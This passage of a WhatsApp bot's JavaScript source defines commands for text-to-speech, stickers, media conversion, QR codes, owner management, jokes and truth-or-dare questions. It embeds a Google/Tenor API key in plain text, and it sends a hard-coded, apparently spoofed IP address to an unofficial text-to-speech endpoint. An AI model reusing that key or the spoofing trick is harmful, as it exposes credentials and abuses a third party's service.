        "en-US-DavisNeural",
        "en-US-ElizabethNeural",
        "en-US-EricNeural",
        "en-US-GuyNeural",
        "en-US-JacobNeural",
        "en-US-JaneNeural",
        "en-US-JasonNeural",
        "en-US-JennyMultilingualNeural",
        "en-US-JennyMultilingualV2Neural",
        "en-US-JennyNeural",
        "en-US-MichelleNeural",
        "en-US-MonicaNeural",
        "en-US-NancyNeural",
        "en-US-RogerNeural",
        "en-US-RyanMultilingualNeural",
        "en-US-SaraNeural",
        "en-US-SteffanNeural",
        "en-US-TonyNeural",
        "en-ZA-LeahNeural",
        "en-ZA-LukeNeural",
        "es-AR-ElenaNeural",
        "es-AR-TomasNeural",
        "es-BO-MarceloNeural",
        "es-BO-SofiaNeural",
        "es-CL-CatalinaNeural",
        "es-CL-LorenzoNeural",
        "es-CO-GonzaloNeural",
        "es-CO-SalomeNeural",
        "es-CR-JuanNeural",
        "es-CR-MariaNeural",
        "es-CU-BelkysNeural",
        "es-CU-ManuelNeural",
        "es-DO-EmilioNeural",
        "es-DO-RamonaNeural",
        "es-EC-AndreaNeural",
        "es-EC-LuisNeural",
        "es-ES-AbrilNeural",
        "es-ES-AlvaroNeural",
        "es-ES-ArnauNeural",
        "es-ES-DarioNeural",
        "es-ES-EliasNeural",
        "es-ES-ElviraNeural",
        "es-ES-EstrellaNeural",
        "es-ES-IreneNeural",
        "es-ES-LaiaNeural",
        "es-ES-LiaNeural",
        "es-ES-NilNeural",
        "es-ES-SaulNeural",
        "es-ES-TeoNeural",
        "es-ES-TrianaNeural",
        "es-ES-VeraNeural",
        "es-GQ-JavierNeural",
        "es-GQ-TeresaNeural",
        "es-GT-AndresNeural",
        "es-GT-MartaNeural",
        "es-HN-CarlosNeural",
        "es-HN-KarlaNeural",
        "es-MX-BeatrizNeural",
        "es-MX-CandelaNeural",
        "es-MX-CarlotaNeural",
        "es-MX-CecilioNeural",
        "es-MX-DaliaNeural",
        "es-MX-GerardoNeural",
        "es-MX-JorgeNeural",
        "es-MX-LarissaNeural",
        "es-MX-LibertoNeural",
        "es-MX-LucianoNeural",
        "es-MX-MarinaNeural",
        "es-MX-NuriaNeural",
        "es-MX-PelayoNeural",
        "es-MX-RenataNeural",
        "es-MX-YagoNeural",
        "es-NI-FedericoNeural",
        "es-NI-YolandaNeural",
        "es-PA-MargaritaNeural",
        "es-PA-RobertoNeural",
        "es-PE-AlexNeural",
        "es-PE-CamilaNeural",
        "es-PR-KarinaNeural",
        "es-PR-VictorNeural",
        "es-PY-MarioNeural",
        "es-PY-TaniaNeural",
        "es-SV-LorenaNeural",
        "es-SV-RodrigoNeural",
        "es-US-AlonsoNeural",
        "es-US-PalomaNeural",
        "es-UY-MateoNeural",
        "es-UY-ValentinaNeural",
        "es-VE-PaolaNeural",
        "es-VE-SebastianNeural",
        "et-EE-AnuNeural",
        "et-EE-KertNeural",
        "eu-ES-AinhoaNeural",
        "eu-ES-AnderNeural",
        "fa-IR-DilaraNeural",
        "fa-IR-FaridNeural",
        "fi-FI-HarriNeural",
        "fi-FI-NooraNeural",
        "fi-FI-SelmaNeural",
        "fil-PH-AngeloNeural",
        "fil-PH-BlessicaNeural",
        "fr-BE-CharlineNeural",
        "fr-BE-GerardNeural",
        "fr-CA-AntoineNeural",
        "fr-CA-JeanNeural",
        "fr-CA-SylvieNeural",
        "fr-CH-ArianeNeural",
        "fr-CH-FabriceNeural",
        "fr-FR-AlainNeural",
        "fr-FR-BrigitteNeural",
        "fr-FR-CelesteNeural",
        "fr-FR-ClaudeNeural",
        "fr-FR-CoralieNeural",
        "fr-FR-DeniseNeural",
        "fr-FR-EloiseNeural",
        "fr-FR-HenriNeural",
        "fr-FR-JacquelineNeural",
        "fr-FR-JeromeNeural",
        "fr-FR-JosephineNeural",
        "fr-FR-MauriceNeural",
        "fr-FR-YvesNeural",
        "fr-FR-YvetteNeural",
        "ga-IE-ColmNeural",
        "ga-IE-OrlaNeural",
        "gl-ES-RoiNeural",
        "gl-ES-SabelaNeural",
        "gu-IN-DhwaniNeural",
        "gu-IN-NiranjanNeural",
        "he-IL-AvriNeural",
        "he-IL-HilaNeural",
        "hi-IN-MadhurNeural",
        "hi-IN-SwaraNeural",
        "hr-HR-GabrijelaNeural",
        "hr-HR-SreckoNeural",
        "hu-HU-NoemiNeural",
        "hu-HU-TamasNeural",
        "hy-AM-AnahitNeural",
        "hy-AM-HaykNeural",
        "id-ID-ArdiNeural",
        "id-ID-GadisNeural",
        "is-IS-GudrunNeural",
        "is-IS-GunnarNeural",
        "it-IT-BenignoNeural",
        "it-IT-CalimeroNeural",
        "it-IT-CataldoNeural",
        "it-IT-DiegoNeural",
        "it-IT-ElsaNeural",
        "it-IT-FabiolaNeural",
        "it-IT-FiammaNeural",
        "it-IT-GianniNeural",
        "it-IT-ImeldaNeural",
        "it-IT-IrmaNeural",
        "it-IT-IsabellaNeural",
        "it-IT-LisandroNeural",
        "it-IT-PalmiraNeural",
        "it-IT-PierinaNeural",
        "it-IT-RinaldoNeural",
        "ja-JP-AoiNeural",
        "ja-JP-DaichiNeural",
        "ja-JP-KeitaNeural",
        "ja-JP-MayuNeural",
        "ja-JP-NanamiNeural",
        "ja-JP-NaokiNeural",
        "ja-JP-ShioriNeural",
        "jv-ID-DimasNeural",
        "jv-ID-SitiNeural",
        "ka-GE-EkaNeural",
        "ka-GE-GiorgiNeural",
        "kk-KZ-AigulNeural",
        "kk-KZ-DauletNeural",
        "km-KH-PisethNeural",
        "km-KH-SreymomNeural",
        "kn-IN-GaganNeural",
        "kn-IN-SapnaNeural",
        "ko-KR-BongJinNeural",
        "ko-KR-GookMinNeural",
        "ko-KR-InJoonNeural",
        "ko-KR-JiMinNeural",
        "ko-KR-SeoHyeonNeural",
        "ko-KR-SoonBokNeural",
        "ko-KR-SunHiNeural",
        "ko-KR-YuJinNeural",
        "lo-LA-ChanthavongNeural",
        "lo-LA-KeomanyNeural",
        "lt-LT-LeonasNeural",
        "lt-LT-OnaNeural",
        "lv-LV-EveritaNeural",
        "lv-LV-NilsNeural",
        "mk-MK-AleksandarNeural",
        "mk-MK-MarijaNeural",
        "ml-IN-MidhunNeural",
        "ml-IN-SobhanaNeural",
        "mn-MN-BataaNeural",
        "mn-MN-YesuiNeural",
        "mr-IN-AarohiNeural",
        "mr-IN-ManoharNeural",
        "ms-MY-OsmanNeural",
        "ms-MY-YasminNeural",
        "mt-MT-GraceNeural",
        "mt-MT-JosephNeural",
        "my-MM-NilarNeural",
        "my-MM-ThihaNeural",
        "nb-NO-FinnNeural",
        "nb-NO-IselinNeural",
        "nb-NO-PernilleNeural",
        "ne-NP-HemkalaNeural",
        "ne-NP-SagarNeural",
        "nl-BE-ArnaudNeural",
        "nl-BE-DenaNeural",
        "nl-NL-ColetteNeural",
        "nl-NL-FennaNeural",
        "nl-NL-MaartenNeural",
        "pl-PL-AgnieszkaNeural",
        "pl-PL-MarekNeural",
        "pl-PL-ZofiaNeural",
        "ps-AF-GulNawazNeural",
        "ps-AF-LatifaNeural",
        "pt-BR-AntonioNeural",
        "pt-BR-BrendaNeural",
        "pt-BR-DonatoNeural",
        "pt-BR-ElzaNeural",
        "pt-BR-FabioNeural",
        "pt-BR-FranciscaNeural",
        "pt-BR-GiovannaNeural",
        "pt-BR-HumbertoNeural",
        "pt-BR-JulioNeural",
        "pt-BR-LeilaNeural",
        "pt-BR-LeticiaNeural",
        "pt-BR-ManuelaNeural",
        "pt-BR-NicolauNeural",
        "pt-BR-ValerioNeural",
        "pt-BR-YaraNeural",
        "pt-PT-DuarteNeural",
        "pt-PT-FernandaNeural",
        "pt-PT-RaquelNeural",
        "ro-RO-AlinaNeural",
        "ro-RO-EmilNeural",
        "ru-RU-DariyaNeural",
        "ru-RU-DmitryNeural",
        "ru-RU-SvetlanaNeural",
        "si-LK-SameeraNeural",
        "si-LK-ThiliniNeural",
        "sk-SK-LukasNeural",
        "sk-SK-ViktoriaNeural",
        "sl-SI-PetraNeural",
        "sl-SI-RokNeural",
        "so-SO-MuuseNeural",
        "so-SO-UbaxNeural",
        "sq-AL-AnilaNeural",
        "sq-AL-IlirNeural",
        "sr-Latn-RS-NicholasNeural",
        "sr-Latn-RS-SophieNeural",
        "sr-RS-NicholasNeural",
        "sr-RS-SophieNeural",
        "su-ID-JajangNeural",
        "su-ID-TutiNeural",
        "sv-SE-HilleviNeural",
        "sv-SE-MattiasNeural",
        "sv-SE-SofieNeural",
        "sw-KE-RafikiNeural",
        "sw-KE-ZuriNeural",
        "sw-TZ-DaudiNeural",
        "sw-TZ-RehemaNeural",
        "ta-IN-PallaviNeural",
        "ta-IN-ValluvarNeural",
        "ta-LK-KumarNeural",
        "ta-LK-SaranyaNeural",
        "ta-MY-KaniNeural",
        "ta-MY-SuryaNeural",
        "ta-SG-AnbuNeural",
        "ta-SG-VenbaNeural",
        "te-IN-MohanNeural",
        "te-IN-ShrutiNeural",
        "th-TH-AcharaNeural",
        "th-TH-NiwatNeural",
        "th-TH-PremwadeeNeural",
        "tr-TR-AhmetNeural",
        "tr-TR-EmelNeural",
        "uk-UA-OstapNeural",
        "uk-UA-PolinaNeural",
        "ur-IN-GulNeural",
        "ur-IN-SalmanNeural",
        "ur-PK-AsadNeural",
        "ur-PK-UzmaNeural",
        "uz-UZ-MadinaNeural",
        "uz-UZ-SardorNeural",
        "vi-VN-HoaiMyNeural",
        "vi-VN-NamMinhNeural",
        "wuu-CN-XiaotongNeural",
        "wuu-CN-YunzheNeural",
        "yue-CN-XiaoMinNeural",
        "yue-CN-YunSongNeural",
        "zh-CN-XiaochenNeural",
        "zh-CN-XiaohanNeural",
        "zh-CN-XiaomengNeural",
        "zh-CN-XiaomoNeural",
        "zh-CN-XiaoqiuNeural",
        "zh-CN-XiaoruiNeural",
        "zh-CN-XiaoshuangNeural",
        "zh-CN-XiaoxiaoNeural",
        "zh-CN-XiaoxuanNeural",
        "zh-CN-XiaoyanNeural",
        "zh-CN-XiaoyiNeural",
        "zh-CN-XiaoyouNeural",
        "zh-CN-XiaozhenNeural",
        "zh-CN-YunfengNeural",
        "zh-CN-YunhaoNeural",
        "zh-CN-YunjianNeural",
        "zh-CN-YunxiNeural",
        "zh-CN-YunxiaNeural",
        "zh-CN-YunyangNeural",
        "zh-CN-YunyeNeural",
        "zh-CN-YunzeNeural",
        "zh-CN-henan-YundengNeural",
        "zh-CN-liaoning-XiaobeiNeural",
        "zh-CN-shaanxi-XiaoniNeural",
        "zh-CN-shandong-YunxiangNeural",
        "zh-CN-sichuan-YunxiNeural",
        "zh-HK-HiuGaaiNeural",
        "zh-HK-HiuMaanNeural",
        "zh-HK-WanLungNeural",
        "zh-TW-HsiaoChenNeural",
        "zh-TW-HsiaoYuNeural",
        "zh-TW-YunJheNeural",
        "zu-ZA-ThandoNeural",
        "zu-ZA-ThembaNeural"
    ]

    let lister = ListVoiceArray(ListVoice);
    let readMore = String.fromCharCode(8206).repeat(4001);

    let query = `Input query!\n\n*Example:*\n${prefix + command} *108 | My Name Is Big Daddy*\n\n` + readMore + lister.map((v, index) => "  " + (index + 1) + ". " + v).join("\n");
    
    function getParts(array, index) {
        if (isNaN(index)) {
            index = Number(index);
            if (isNaN(index)) {
                return replyphistar("Index must be a number");
            }
        }

        const text = array[index - 1];
        const language = getLanguage(text);
        return {
            short: language,
            long: text
        };
    }

    function getLanguage(text) {
        const parts = text.split("-");
        return parts.slice(0, 2).join("-");
    }
            
    async function generateVoice(Locale = "id-ID", Voice = "id-ID-ArdiNeural", Query) {
        const formData = new FormData();
        formData.append("locale", Locale);
        formData.append("content", `<voice name="${Voice}">${Query}</voice>`);
        formData.append("ip", '46.161.194.33');
        const response = await fetch('https://app.micmonster.com/restapi/create', {
            method: 'POST',
            body: formData
        });
        return Buffer.from(('data:audio/mpeg;base64,' + await response.text()).split(',')[1], 'base64');
    };
    
    let text;
    if (args.length >= 1) {
        text = args.slice(0).join(" ");
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text;
    } else {
        return replyphistar(query);
    }
    
    let [atas, bawah] = text.split("|");
    if (!atas) return replyphistar(query);
    if (!bawah) return replyphistar(query);
    
    const { short, long } = getParts(ListVoice, atas);
    
    try {
        replyphistar(`Processing your request...\n` + long.replace(/(.+)-(.+)-(.+)Neural/, "$3 ($1-$2)"));

        let res = await generateVoice(short, long, bawah);
        if (res) {
            await PhistarBotInc.sendMessage(m.chat, {
                audio: res,
                mimetype: 'audio/mp4',
                ptt: true,
                waveform: [100, 0, 100, 0, 100, 0, 100]
            }, { quoted: m });
        }
    } catch (e) {
        replyphistar(`❌ Error processing your request: ${e.message}`);
    }
    break;
}
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replyphistar(respond)
                if (!text) return replyphistar(respond)
                replyphistar(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await PhistarBotInc.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replyphistar(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
PhistarBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
PhistarBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await PhistarBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyphistar('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await PhistarBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replyphistar(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replyphistar(`Reply sticker with caption *${prefix + command}*`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    PhistarBotInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replyphistar(`Reply sticker with caption *${prefix + command}*`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await PhistarBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyphistar(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                PhistarBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyphistar(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                PhistarBotInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `Phistar.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyphistar(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                PhistarBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replyphistar(`Reply sticker with caption *${prefix + command}*`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await PhistarBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replyphistar(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replyphistar(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replyphistar(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replyphistar(`Example : ${prefix + command} 😅+🤔`)
                replyphistar(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await PhistarBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replyphistar(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await PhistarBotInc.downloadAndSaveMediaMessage(quoted)
                    PhistarBotInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `Here you go!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await PhistarBotInc.downloadAndSaveMediaMessage(quoted)
                    PhistarBotInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replyphistar(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await PhistarBotInc.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replyphistar(`Example:\n${prefix}fliptext Xeony`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replyphistar(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'listvn': {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VoiceNoteXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteXeon.length}*`
                replyphistar(teks)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of StickerXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerXeon.length}*`
                replyphistar(teks)
            }
            break
            case 'listimage': {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of ImageXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${ImageXeon.length}*`
                replyphistar(teks)
            }
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of VideoXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VideoXeon.length}*`
                replyphistar(teks)
            }
            break
            case 'addowner':
                if (!isCreator) return replyphistar(mess.owner)
if (!args[0]) return replyphistar(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await PhistarBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replyphistar(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyphistar(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
                if (!isCreator) return replyphistar(mess.owner)
if (!args[0]) return replyphistar(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyphistar(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
            case 'addvideo': {
                if (!isPremium) return replyphistar(mess.prem)
                if (args.length < 1) return replyphistar('Video Name?')
                if (VideoXeon.includes(q)) return replyphistar("The name you entered already exists")
                let delb = await PhistarBotInc.downloadAndSaveMediaMessage(quoted)
                VideoXeon.push(q)
                await fsx.copy(delb, `./Phistar-media/video/${q}.mp4`)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(delb)
                replyphistar(`Success Adding Video\To View Type ${prefix}listvideo`)
            }
            break
            case 'delvideo': {
                if (!isPremium) return replyphistar(mess.prem)
                if (args.length < 1) return replyphistar('Enter the Video Name')
                if (!VideoXeon.includes(q)) return replyphistar("Name Does Not Exist in Database")
                let wanu = VideoXeon.indexOf(q)
                VideoXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(`./Phistar-media/video/${q}.mp4`)
                replyphistar(`Successfully Deleted Video ${q}`)
            }
            break
            case 'addimage': {
                if (!isPremium) return replyphistar(mess.prem)
                if (args.length < 1) return replyphistar('The name of the image?')
                if (ImageXeon.includes(q)) return replyphistar("The name you entered is already registered in the database")
                let delb = await PhistarBotInc.downloadAndSaveMediaMessage(quoted)
                ImageXeon.push(q)
                await fsx.copy(delb, `./Phistar-media/image/${q}.jpg`)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(delb)
                replyphistar(`Success In Adding Image\nTo Check Type ${prefix}listimage`)
            }
            break
            case 'delimage': {
                if (!isPremium) return replyphistar(mess.prem)
                if (args.length < 1) return replyphistar('Enter the Image Name')
                if (!ImageXeon.includes(q)) return replyphistar("The image name you entered is not registered")
                let wanu = ImageXeon.indexOf(q)
                ImageXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(`./Phistar-media/image/${q}.jpg`)
                replyphistar(`Successfully Deleted Image ${q}`)
            }
            break
            case 'addsticker': {
                if (!isPremium) return replyphistar(mess.prem)
                if (args.length < 1) return replyphistar('Enter the name of the sticker?')
                if (StickerXeon.includes(q)) return replyphistar("Name Already In Use")
                let delb = await PhistarBotInc.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./Phistar-media/sticker/${q}.webp`)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(delb)
                replyphistar(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
            }
            break
            case 'joke':
    try {
        // List of 100 jokes
        const jokes = [
            "Why don't skeletons fight each other? They don't have the guts!",
            "Why did the scarecrow win an award? Because he was outstanding in his field!",
            "I told my wife she was drawing her eyebrows too high. She looked surprised.",
            "Why don’t eggs tell jokes? Because they’d crack each other up!",
            "I told my computer I needed a break, and now it won't stop sending me Kit-Kats.",
            "I asked my dog what’s two minus two. He said nothing.",
            "How do you make a tissue dance? You put a little boogey in it!",
            "I used to play piano by ear, but now I use my hands.",
            "I wondered why the baseball kept getting bigger. Then it hit me.",
            "I told my wife she was getting too emotional during our argument, but she didn’t take it well. She stormed off to the freezer and threw a bag of peas at me. It was a real cold shoulder.",
            "I threw a boomerang 10 years ago and I still haven’t gotten it back.",
            "Did you hear about the Italian chef that died? He pasta way. We cannoli do so much. His legacy will be a pizza history.",
            "What’s orange and sounds like a parrot? A carrot!",
            "I used to be a baker, but I couldn't make enough dough.",
            "Why don’t oysters donate to charity? Because they are shellfish.",
            "I couldn't figure out how to put my seatbelt on, but then I realized I was just too tight.",
            "I have a fear of speed bumps, but I am slowly getting over it.",
            "What do you call fake spaghetti? An impasta!",
            "I got a job at a bakery because I kneaded dough.",
            "Why did the golfer bring an extra pair of pants? In case he got a hole in one.",
            "I’m reading a book on anti-gravity. It’s impossible to put down.",
            "What did one wall say to the other? I'll meet you at the corner.",
            "I’ve started investing in stocks: beef, chicken, and vegetable. One day I hope to be a bouillonaire.",
            "What do you call a pile of cats? A meow-tain.",
            "How does a penguin build its house? Igloos it together.",
            "Why don’t some couples go to the gym? Because some relationships don’t work out.",
            "I couldn’t figure out how to put my seatbelt on. But then I realized I was just too tight.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "Why do cows have hooves instead of feet? Because they lactose.",
            "I broke my finger last week. On the other hand, I’m okay.",
            "What do you call an alligator in a vest? An investigator.",
            "What do you call a bear with no teeth? A gummy bear.",
            "I'm no good at math, but I know that one plus one equals two... unless you're doing algebra.",
            "Why don't seagulls fly over the bay? Because then they’d be bagels.",
            "I told my computer I needed a break, and it froze.",
            "I used to be a fireman, but I got burned out.",
            "I want to be a professional kleptomaniac, but I’m just stealing time.",
            "I have a joke about construction, but I’m still working on it.",
            "I got a reversible jacket for my birthday. I can’t wait to see how it turns out.",
            "I told my wife she was getting too emotional during our argument, but she didn’t take it well. She stormed off to the freezer and threw a bag of peas at me. It was a real cold shoulder.",
            "I couldn't figure out how to put my seatbelt on, but then I realized I was just too tight.",
            "I used to play piano by ear, but now I use my hands.",
            "I'm reading a book about anti-gravity, it's impossible to put down.",
            "I have a fear of speed bumps, but I’m slowly getting over them.",
            "I used to play piano by ear, but now I use my hands.",
            "What do you call a pile of cats? A meow-tain.",
            "Why don't skeletons fight each other? They don’t have the guts!",
            "I used to be a baker, but I couldn't make enough dough.",
            "How do you make a tissue dance? You put a little boogey in it!",
            "Why did the golfer bring an extra pair of pants? In case he got a hole in one.",
            "I told my computer I needed a break, and it froze.",
            "I got a job at a bakery because I kneaded dough.",
            "What did one wall say to the other? I’ll meet you at the corner.",
            "I’m reading a book on anti-gravity. It’s impossible to put down.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "Why don’t some couples go to the gym? Because some relationships don’t work out.",
            "What’s orange and sounds like a parrot? A carrot!",
            "I told my wife she was drawing her eyebrows too high. She looked surprised.",
            "Why do cows have hooves instead of feet? Because they lactose.",
            "I couldn’t figure out how to put my seatbelt on. But then I realized I was just too tight.",
            "I’m no good at math, but I know that one plus one equals two… unless you're doing algebra.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "Why do cows have hooves instead of feet? Because they lactose.",
            "Why don’t oysters donate to charity? Because they are shellfish.",
            "I want to be a professional kleptomaniac, but I’m just stealing time.",
            "What did one wall say to the other? I'll meet you at the corner.",
            "I have a fear of speed bumps, but I am slowly getting over it.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "I told my computer I needed a break, and it froze.",
            "What do you call fake spaghetti? An impasta!",
            "I told my wife she was getting too emotional during our argument, but she didn’t take it well.",
            "I have a joke about construction, but I’m still working on it.",
            "I threw a boomerang 10 years ago and I still haven’t gotten it back.",
            "What do you call an alligator in a vest? An investigator.",
            "What do you call a bear with no teeth? A gummy bear.",
            "Why don’t some couples go to the gym? Because some relationships don’t work out.",
            "I’ve started investing in stocks: beef, chicken, and vegetable. One day I hope to be a bouillonaire.",
            "I got a job at a bakery because I kneaded dough.",
            "What’s a skeleton’s least favorite room in the house? The living room."
        ];
        await PhistarBotInc.sendMessage(m.chat, {
            text: `*🤣 Joke Time! 🤣*\n\n${jokes[Math.floor(Math.random() * jokes.length)]}\n\n*Hope that made you smile! 😄*`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the joke. Please try again later.');
        console.error('Joke error:', err);
    }
    break;
    case 'truth':
    try {
        // List of 100 truth questions
        const truthQuestions = [
            "What is your biggest fear?",
            "Have you ever lied to get out of trouble?",
            "What’s something you’ve never told anyone?",
            "If you could switch lives with someone for a day, who would it be?",
            "What’s the most embarrassing thing you’ve done?",
            "If you had to choose one person to be stuck with on a deserted island, who would it be?",
            "Have you ever had a crush on someone in this group?",
            "What’s the most awkward situation you’ve ever been in?",
            "If you could erase one event from your memory, what would it be?",
            "What’s one thing you regret doing in your life?",
            "What’s the last lie you told?",
            "Have you ever cheated in a relationship?",
